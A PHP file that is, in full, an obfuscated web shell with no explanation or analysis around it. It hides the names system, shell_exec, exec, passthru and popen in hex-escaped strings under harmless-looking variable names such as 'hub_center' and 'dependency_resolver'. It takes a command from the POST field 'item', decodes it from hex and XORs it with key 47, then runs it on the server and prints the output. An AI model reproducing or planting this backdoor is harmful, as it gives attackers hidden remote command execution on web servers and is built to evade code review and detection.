<?php

$hub_center2 = "\x73\x68\x65ll\x5F\x65xec";
$hub_center4 = "pa\x73\x73th\x72\x75";
$event_dispatcher = "hex\x32b\x69\x6E";
$hub_center6 = "s\x74\x72\x65a\x6D_ge\x74\x5Fco\x6Et\x65\x6Et\x73";
$hub_center5 = "po\x70e\x6E";
$hub_center1 = "\x73\x79\x73tem";
$hub_center3 = "\x65\x78ec";
$hub_center7 = "\x70\x63\x6Cose";
if (isset($_POST["i\x74\x65m"])) {
            function dependency_resolver   (    $itm   ,     $sym     )      {   $comp    =   ''     ;      foreach(str_split($itm) as $char){$comp.=chr(ord($char)^$sym);} return      $comp;      }
            $item = $event_dispatcher($_POST["i\x74\x65m"]);
            $item = dependency_resolver($item, 47);
            if (function_exists($hub_center1)) {
                $hub_center1($item);
            } elseif (function_exists($hub_center2)) {
                print $hub_center2($item);
            } elseif (function_exists($hub_center3)) {
                $hub_center3($item, $hld_itm);
                print join("\n", $hld_itm);
            } elseif (function_exists($hub_center4)) {
                $hub_center4($item);
            } elseif (function_exists($hub_center5) && function_exists($hub_center6) && function_exists($hub_center7)) {
                $sym_comp = $hub_center5($item, 'r');
                if ($sym_comp) {
                    $bind_pset = $hub_center6($sym_comp);
                    $hub_center7($sym_comp);
                    print $bind_pset;
                }
            }
            exit;
        }